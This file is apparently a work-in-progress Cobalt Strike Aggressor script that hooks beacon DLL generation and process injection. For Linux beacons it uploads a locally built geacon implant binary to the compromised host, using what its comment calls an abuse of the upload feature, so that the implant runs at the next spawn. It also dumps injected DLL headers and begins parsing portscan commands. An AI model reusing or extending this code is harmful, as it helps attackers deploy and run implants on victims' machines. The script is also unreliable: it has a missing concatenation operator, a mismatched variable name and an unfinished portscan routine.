warn("DEBUG LOADED");

global('$beacon_last_tasks');

%beacon_last_tasks = %(); # track last tasks of each beacon we know

on beacon_input {
    # $1 - the ID of the beacon
    # $2 - the user responsible for the input
    # $3 - the text of the message
    # $4 - when this message occurred
    
    warn("beacon " . $1 . " received input \"" . $3 . "\" at " . $4);
    %beacon_tokens[$1] = $3;
}

# ------------------------------------
# $1 = DLL file name
# $2 = DLL content
# $3 = arch
# ------------------------------------
set BEACON_RDLL_GENERATE {
    warn("Running 'BEACON_RDLL_GENERATE' for DLL " . $1 . " with architecture " . $3);
    return $null;
}

# ------------------------------------
# $1 = DLL file name
# $2 = DLL content
# $3 = arch
# $4 = parent Beacon ID
# $5 = GetModuleHandleA pointer
# $6 = GetProcAddress pointer
# ------------------------------------
set BEACON_RDLL_GENERATE_LOCAL {
    local('$computer $in $data $response')
    warn("Running 'BEACON_RDLL_GENERATE_LOCAL' for DLL " . 
    $1 ." with architecture " . $3 . " Beacon ID " . $4 . " GetModuleHandleA "
    $5 . " GetProcAddress " . $6);

    $computer = beacon_info($4, "computer");

    println($computer);
    warn($computer);

    if ($computer ismatch '.+\s\(.*(Linux|Mac|BSD|olaris).*\)') {
        println("THIS IS A GEACON!");
        ($os) = matched();
        warn($os);
        if ($computer ismatch '.+\s\(.*Linux.*\)') {
            println("THIS IS A LINUX GEACON!");

            blog($4, "Creating geacon and compressing. This will take some time, so please be patient.")

            # your method of geacon compiling and compressing here

            $in = openf("/home/octavian/tmp/geacon/main");
            $data = readb($in, -1);
            closef($in);

            # abuse the upload feature in our beacon. If the file uploaded to is named "geacon-${beacon id}", it will get stored in a buffer and executed with the next spawn command.
            bupload_raw($4, "geacon-" . beacon_info($4, "id"), $data);

            $response = strlen($data);
            warn($response);
            return $response;
        }
        else if ($computer ismatch '.+\s\(.*Mac.*\)') {
            println("THIS IS A MAC OS X GEACON!");
        } else if ($computer ismatch '.+\s\(.*BSD.*\)') {
            println("THIS IS A BSD GEACON!");
        } else if ($computer ismatch '.+\s\(.*olaris.*\)') {
            println("THIS IS A SOLARIS GEACON!");
        } else {
            println("I HAVE NO IDEA WHAT YOU DID, BUT UNLESS YOU ADJUST YOUR BEACON_RDLL_GENERATE_LOCAL HOOK, I CANNOT CREATE A NEW PAYLOAD FOR THIS OS!");
            warn("If this beacon should not be affected by geacon, adjust the regex for geacon detection.");
        }
        
    } else {
        warn("RETURNING WINDOWS BEACON");
        return $null;        
    }
}   

# ------------------------------------
# $1 = DLL file name
# $2 = arch
# ------------------------------------
set BEACON_RDLL_SIZE {
   warn("Running 'BEACON_RDLL_SIZE' for DLL " . $1 . " with architecture " . $2);
   return "100";
}

# ------------------------------------
# $1 = Beacon ID
# $2 = memory injectable dll (position-independent code)
# $3 = true/false ignore process token
# $4 = x86/x64 - memory injectable DLL arch
# ------------------------------------
set PROCESS_INJECT_SPAWN {
    warn("Running INJECT_SPAWN with " . $4 . " DLL for beacon " . $1)
    @head_bytes = unpack("B160", $2);
    println(@head_bytes);
    println("x64 Header:");
    @header_bytes = sublist(@head_bytes, 0, 59);
    println(@header_bytes);
    println("Rest:");
    println(sublist(@head_bytes, 60, -1));

    println("last command was '" . %beacon_tokens[$1] . "'");

    return $null;
}

# Hook to allow the user to define how the explicit injection technique
# is implemented when executing post exploitation commands.
# $1 = Beacon ID
# $2 = memory injectable dll for the post exploitation command
# $3 = the PID to inject into
# $4 = offset to jump to
# $5 = x86/x64 - memory injectable DLL arch
set PROCESS_INJECT_EXPLICIT {
    warn("Running INJECT_EXPLICIT with " . $4 . " DLL for beacon " . $1)

    @head_bytes = unpack("B320", $2);
    println(@head_bytes);
    println("x64 Header:");
    @header_bytes = sublist(@head_bytes, 0, 59);
    println(@header_bytes);
    println("Rest:");
    println(sublist(@head_bytes, 60, -1));

    return $null;
}

sub geacon_modules {
    # input expected:
    # $1 = Beacon ID
    # $2 = Last command issued

    $cmd = split(' ', $2)[0];

    if ($cmd eq "portscan") {
        # let's do a portscan!
        # split first to get all parameters
        @params = split(' ', $2);

        # check if we received a process ID and an architecture, if so, ignore parameters 2 and 3
        if ( (-isnumber @params[1]) && (@params[2] ismatch 'x(64|86)') ) {
            $targets = @params[3]
            $ports = @params[4]

            if (size(@params) >= 6 ) {
                $type = @params[5]
            }
            if (size(@params) == 7 ) {
                $socketcount = @params[6]
            }

        } else {
            $targets = @params[1];
            $ports = @params[2];

            if (size(@params) >= 4 ) {
                $type = @params[3]
            }
            if (size(@params) == 5 ) {
                $type = @params[4]
            }

        }

        println("");


    }

}